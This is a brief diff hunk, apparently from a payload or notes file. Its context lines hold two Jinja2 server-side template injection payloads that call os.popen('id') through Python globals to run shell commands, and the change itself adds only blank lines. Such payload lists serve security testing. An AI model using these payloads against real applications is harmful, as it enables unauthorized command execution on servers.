@@ -16,3 +16,5 @@ updated_at: '2023-04-10T20:23:48.181440+00:00'
 {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
 {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
 ```
+
+
